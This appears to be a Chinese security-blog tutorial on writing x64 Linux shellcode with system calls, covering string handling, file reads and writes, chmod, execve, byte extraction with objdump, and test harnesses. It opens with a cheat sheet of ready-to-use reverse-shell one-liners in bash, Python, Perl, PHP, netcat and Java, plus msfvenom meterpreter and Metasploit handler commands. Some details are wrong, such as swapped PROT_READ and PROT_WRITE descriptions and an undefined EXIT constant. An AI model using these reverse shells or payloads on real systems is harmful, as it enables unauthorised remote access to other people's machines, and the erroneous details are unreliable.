# 玩转 Linux Shellcode 
本篇主要是以x64系统为例对系统调用中一些功能性函数的解读和实际运用。目前网络上流传的通用shellcode，均使用系统调用实现，在记录整个学习过程的同时分享给大家一起学习探讨。
## shell 
bash版：

bash -i >& /dev/tcp/10.10.1.24/3456 0>&1

bash -i &> /dev/tcp/192.168.1.101/4567

bash -i &> /dev/tcp/10.42.0.1 0<&1

python版：

python -c 'import pty;pty.spawn("/bin/bash")'

python -c import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.42.0.1",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);'


perl版:

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

php版：
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

nc版：
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999

java版：
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()


msfvenom -p php/meterpreter/reverse_tcp lhost=1.1.1.1 lport 1234 -f > 1.php
use exploit/multi/hander
set lhost
set lport
set payload 
exploit~~~~

## 0x01 Shellcode 简介

### 0x1 shellcode

Shellcode 是一段可以执行特定功能的特殊汇编代码，在设备漏洞利用过程中注入到目标程序中从而被执行，在比赛或者是实战中栈溢出漏洞使用的更为频繁，编写Shellcode比编写RopGagdet更为简单，栈溢出的最经典的利用方式是Ret2Shellcode。

### 0x2 exploit 与 shellcode关系

exploit主要强调执行控制权，而shellcode更关注于有了控制权之后的功能。因此shellcode更像是exploit的载荷，往往对于不同漏洞来讲exploit是特殊的，而shellcode会具有一些通用性。

## 0x02 使用条件

对 shellcode 有了大概的了解之后，看一看其使用场景。一般来说这三点是必备条件，缺一不可，通过控制程序流程跳转到shellcode地址上去。

### 0x1 拥有程序控制权

这一点毋庸置疑，可以通过栈溢出或者是格式化字符串,堆溢出等漏洞劫持程序的执行流。所以shellcode等的定位是漏洞触发之后的漏洞利用，主要负责实现攻击者的攻击目的。

### 0x2 拥有shellcode地址

不论是程序拥有随机化还是固定基地址，都需要在跳转之前获取shellcode存储地址，一般采用的技巧是

- 在程序bss段固定，且程序地址不随机
- shellcode为程序正常功能输入，在寄存器中保存有其地址
- 在堆栈附近存在与shellcode地址相关联地址

### 0x3 shellcode在可执行内存空间

最后跳转到shellcode地址上后需要有可执行权限才能执行。但通常程序开启NX保护后，其内存空间禁止代码执行，这是只能通过mprotect函数修改shellcode内存权限，赋予可执行权限后再跳转。一般利用 RopGagdet 布局mprotect 函数修改内存权限。

[![](_v_images/20200902161213045_9712.jpg)](https://p4.ssl.qhimg.com/t013f589670e91bd1df.jpg)

重点关注两个方面 start地址和prot取值

**1 起始地址**

需要指出的是，锁指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。

**2 prot赋值**

prot可以取以下几个值，并且可以用“|”将几个属性合起来使用，括号中的数字是在预编译的时候替换的真实值：

1）PROT_READ(1)：表示内存段内的内容可写；  
2）PROT_WRITE(2)：表示内存段内的内容可读；  
3）PROT_EXEC(4)：表示内存段中的内容可执行；  
4）PROT_NONE(0)：表示内存段中的内容根本没法访问。

## 0x03 编写技巧

打算从系统调用函数、字符串设计、代码模板、shellcode提取这几个发面着手写这部分内容，主要解决以下三大问题：

- 对系统调用函数不熟悉，特别是为参数赋值问题挠头
- 对汇编代码编写不熟悉，解决寄存器和内存应用问题
- 对汇编代码编译不熟悉，解决怎么从编译好的汇编程序中完整提取shellcode问题

### 0x1 系统调用函数

提到shellcode 就不得不说系统调用，我们首先考虑为什么要写shellcode，其目的是执行一些程序本身不具备的功能，实现攻击者的攻击目的。凑巧的是在汇编语言中有这么一些函数调用基本可以实现所有功能，我们称他们为系统调用函数，通过系统调用可以直接访问系统内核，具有非常强大的功能。

[![](_v_images/20200902161212737_1115.jpg)](https://p2.ssl.qhimg.com/t01af2016573b640797.jpg)

详细的系统调用表网址如下

[https://filippo.io/linux-syscall-table/](https://filippo.io/linux-syscall-table/)  
[https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/9.4\_linux\_syscall.html](https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/9.4_linux_syscall.html)

系统调用 在汇编代码中表示为syscall（int 0x80）指令，32和64位系统有所区别，二者有单独调用表。

### 0x2 巧取字符串

初步认识shellcode的编写技巧，先从最简单的例子看起，下面代码如果当作汇编语言执行是完全没有问题的，但是如果做为shellcode的话还是差点火候。这里用两种方法规避这种错误：

```
section .data
    WRITE equ 1
    EXIT  equ 60
    MESSAGE db "Hello", 0xa
section .text
    global _start

_start:
    mov     rax, WRITE
    mov     rdi, 1
    mov     rsi, MESSAGE
    mov     rdx, 5
    syscall
    jmp exit

exit:
    mov rax, EXIT
    mov rdi, 0
    syscall

```

编译指令如下

```
nasm -g -f elf64 -o asm.o asm.s
ld -o asm asm.o

```

编译过后可以发现字符串位于data段，指针利用的是绝对地址，在shellcode中是不能出现绝对地址，这也是shellcode的头等大忌。

[![](_v_images/20200902161212520_12749.jpg)](https://p4.ssl.qhimg.com/t01b69b3f7169723e82.jpg)

**1 方法一**

利用call指令压栈的特性，将字符串的地址压栈之后再pop到寄存器中，在shellcode编写中是一种非常常用的方法。我们可以看到字符串紧跟在call指令之后，因为call压栈就是压的下一条指令的地址，此地址正好为字符串地址。

```
section .data
    WRITE equ 1
    EXIT  equ 60
section .text
    global _start

_start:
    mov     rax, WRITE
    mov     rdi, 1
    jmp     getstring
string:
    pop     rsi
    mov     rdx, 5
    syscall
    jmp exit

getstring:
    call string
    MESSAGE db "Hello", 0xa

exit:
    mov rax, EXIT
    mov rdi, 0
    syscall

```

**2 方法二**

同时也是利用栈的特性，将字符串计算过大小，以及分割完毕之后就可以分拨压进栈中，保存最后的esp值就可以实现字符串地址的获取。

```
section .data
    WRITE equ 1
    EXIT  equ 60
    MESSAGE db "Hello", 0xa
section .text
    global _start
_start:
    mov     rax, WRITE
    mov     rdi, 1
    mov     rsi,0x00000a6f6c6c6548
    push    rsi    
    mov     rsi, rsp
    mov     rdx, 5
    syscall
    jmp exit

exit:
    mov rax, EXIT
    mov rdi, 0
    syscall

```

### 0x3 文件读

**1 sys_open**

文件读写都需要涉及打开文件操作，是通过内核提供的系统调用sys_open来实现的。具体参数如下：

```
asmlinkage long sys_open(const char __user *filename, int flags, int mode)

```

[![](_v_images/20200902161212205_26804.jpg)](https://p4.ssl.qhimg.com/t013f736ff7efd8f8c0.jpg)

[![](_v_images/20200902161211998_301.jpg)](https://p4.ssl.qhimg.com/t017c6066c23728ea72.jpg)

这里需要注意在文件操作之后，需要利用close函数关闭文件描述符。分别介绍flags和mode参数取值，flags表示在打开文件时标志属性，mode为在创建文件的时候文件属性。

**flags**  
表示只读、只写和创建。如果想赋予多个属性可以用`|`链接类似于 `O_WRONLY|O_CREAT`

| Name | Value | 进制 |
| --- | --- | --- |
| O_WRONLY | 0001 | 8 |
| O_RDONLY | 0000 | 8 |
| O_CREAT | 0100 | 8 |
| O_RDWR | 0002 | 8 |
| O_APPEND | 2000 | 8 |
| O_TRUNC | 1000 | 8 |
| O_EXCL | 0200 | 8 |

**mode**  
mode 相关取值表如下，值得注意是mode的表示为8进制，也就是说 777 的`rwxrwxrwx` 权限是8进制数。用下面的 属性标示为 `S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP|S_IWGRP|S_IXGRP|S_IROTH|S_IWOTH|S_IXOTH`

| Name | Value | 标志属性 |
| --- | --- | --- |
| S_ISUID | 04000 | 文件的 (set user-id on execution)位 |
| S_ISGID | 02000 | 文件的 (set group-id on execution)位 |
| S_ISVTX | 01000 | 文件的sticky 位 |
| S_IRUSR | 00400 | 文件所有者具可读取权限 |
| S_IWUSR | 00200 | 文件所有者具可写入权限 |
| S_IXUSR | 00100 | 文件所有者具可执行权限 |
| S_IRGRP | 00040 | 用户组具可读取权限 |
| S_IWGRP | 00020 | 用户组具可写入权限 |
| S_IXGRP | 00010 | 用户组具可执行权限 |
| S_IROTH | 00004 | 其他用户具可读取权限 |
| S_IWOTH | 00002 | 其他用户具可写入权限 |
| S_IXOTH | 00001 | 其他用户具可执行权限 |

以666为例其实十进制为438  
打开文件用汇编表示为

```
section .data
    OPEN equ 2
    EXIT  equ 60
    FILENAME db "test", 0x00
section .text
    global _start
_start:
    mov     rax, OPEN
    mov     rdi, FILENAME
    mov     rsi, 2
    mov     rdx, 666
    syscall
    jmp exit
exit:
    mov rax, EXIT
    mov rdi, 0
    syscall

```

**2 sys_read**

[![](_v_images/20200902161211891_19685.jpg)](https://p1.ssl.qhimg.com/t0187644be6b953ea85.jpg)

```
section .data
    OPEN equ 2
    READ equ 0
    EXIT  equ 60
    FILENAME db "xxx", 0x00
    BUFFER db "11111"
section .text
    global _start
_start:
    mov     rax, OPEN
    mov     rdi, FILENAME
    mov     rsi, 2
    mov     rdx, 511
    syscall

    mov     rdi, rax
    mov     rax, READ
    mov     rsi, BUFFER
    mov     rdx, 8
    syscall

    mov rax, EXIT
    mov rdi, 0
    syscall

```

上述代码中xxx为二进制文件，如下图成功读出elf内容：

[![](_v_images/20200902161211658_9122.jpg)](https://p5.ssl.qhimg.com/t012acf156b137d5c2d.jpg)

[![](_v_images/20200902161211448_23411.png)](https://p3.ssl.qhimg.com/t0166b7d8c51dd40368.png)

### 0x4 文件写

open 操作与之前一样，新增write操作，相关系统调用参数如下：

[![](_v_images/20200902161211240_7600.jpg)](https://p5.ssl.qhimg.com/t0131b95a9567e6e531.jpg)

```
section .data
    OPEN equ 2
    EXIT  equ 60
    FILENAME db "hehe", 0x00

section .text
    global _start
_start:
    mov     rax, OPEN
    mov     rdi, FILENAME
    mov     rsi, 65
    mov     rdx, 511
    syscall
    mov     rdi, rax
    jmp wirte

wirte:
    mov     rsi, FILENAME
    mov     rdx, 4
    syscall
    jmp exit
exit:
    mov rax, EXIT
    mov rdi, 0
    syscall

```

### 0x5 权限修改

在linux中权限修改利用chmod指令，在系统调用的时候采用的sys_chmod函数

[![](_v_images/20200902161211033_7765.jpg)](https://p3.ssl.qhimg.com/t012420be1f6e02cede.jpg)

在分析open函数时有讨论mode的取值，这里就不再分析  
有时在shellcode中需要修改程序的权限

```
#include <sys/types.h>
#include <sys/stat.h>
main()
{
    chmod("/etc/passwd", S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);
}

```

```
section .data
    CHMOD equ 90
    EXIT  equ 60
    FILENAME db "xxx", 0x00
section .text
    global _start
_start:
    mov     rax, CHMOD
    mov     rdi, FILENAME
    mov     rsi, 511
    syscall

    mov rax, EXIT
    mov rdi, 0
    syscall

```

### 0x6 命令执行

system函数中的命令执行用的是syscall execve系统调用。其参数格式如下

[![](_v_images/20200902161210912_15706.jpg)](https://p0.ssl.qhimg.com/t01a153013e36b8005f.jpg)

调试system函数内部的参数调用可以看出rax是系统调用号，rdi是filename，rsi是字符串数组

[![](_v_images/20200902161210701_6684.jpg)](https://p0.ssl.qhimg.com/t01756efcf735cf9b50.jpg)

字符串数组内存布局如下

[![](_v_images/20200902161210488_12013.png)](https://p2.ssl.qhimg.com/t0111c13d9d17f0031a.png)

```
section .data
    EXECVE equ 59
    FILENAME db "/bin/bash", 0x00
section .text
    global _start
_start:
    mov     rax, EXECVE
    mov     rdi, FILENAME
    mov     rsi, 0
    mov     rdx, 0
    syscall

    mov rax, EXIT
    mov rdi, 0
    syscall

```

### 0x7 shellcode 提取技巧

这里参照 [https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump](https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump)

```
objdump -d ./test|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' ' | tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

```

[![](_v_images/20200902161210279_14179.jpg)](https://p0.ssl.qhimg.com/t0161954772aba2bf61.jpg)

## 0x04 验证技巧

走到这一步的大哥们都已经编好了自己的shellcode，开始磨刀霍霍向牛羊了，这里介绍两种常用的检查shellcode功能的方法，内联汇编和函数指针。

### 0x0 关闭栈不可执行

因为在测试时，shellcode在bss段，在关闭NX编译选项之后bss段也拥有了可执行属性，具体操作如下。

注意在编译的时候加上 `-z execstack`

```
gcc -o test test.c -z execstack

```

[![](_v_images/20200902161210069_32267.jpg)](https://p2.ssl.qhimg.com/t01a261265ef3c9807c.jpg)

[![](_v_images/20200902161209862_18041.jpg)](https://p2.ssl.qhimg.com/t011a46482aa216e974.jpg)

### 0x1 内联汇编

在linux 下的c语言中主要采用的是 att格式的汇编，这里有个坑，一开始没接触c内联att格式汇编的小盆友们要注意了`jmp eax`的写法为`jmp *%rax`

```
#include<stdio.h>
char shellcode[] = "\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\xeb\x0a\x5e\xba\x05\x00\x00\x00\x0f\x05\xeb\x0b\xe8\xf1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x0a\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05";
int main(int argc, char **argv)
{
        __asm__("lea shellcode,%eax;jmp *%rax");
       return 0;
}

```

如图中代码所示，rip已经指向`jmp rax`指令此时的rax就是shellcode那段字符串的地址。因为这段内存拥有可执行，最后成功执行shellcode。

[![](_v_images/20200902161209754_28409.jpg)](https://p4.ssl.qhimg.com/t01b76b75cc17a5f938.jpg)

### 0x2 函数指针

第二种方法大同小异，也是将shellcode放在程序的bss段上，利用之前的编译指令编好后调试。

```
#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = "\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\xeb\x0a\x5e\xba\x05\x00\x00\x00\x0f\x05\xeb\x0b\xe8\xf1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x0a\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05";
int main(void)
{
    int (*func)() = (int(*)())shellcode;
    func();
}

```

[![](_v_images/20200902161209426_10572.jpg)](https://p5.ssl.qhimg.com/t017edf0862e942ca30.jpg)

在上述汇编代码中可以看出将shellcode 的地址赋值给了rdx寄存器，后续直接call调用。

## 0x05 总结

简单的记录了常见shellcode功能编写测试方法，本文介绍的还是比较宽泛，也只针对64位系统进行分析，之后会把其他架构还有x86的利用方式慢慢补齐，还请大佬们多指点指点。

## 0x06 参考文献

[https://filippo.io/linux-syscall-table/](https://filippo.io/linux-syscall-table/)  
[https://xz.aliyun.com/t/2052](https://xz.aliyun.com/t/2052)  
[http://www.vividmachines.com/shellcode/shellcode.html](http://www.vividmachines.com/shellcode/shellcode.html)  
[https://blog.csdn.net/littlehedgehog/article/details/2653743](https://blog.csdn.net/littlehedgehog/article/details/2653743)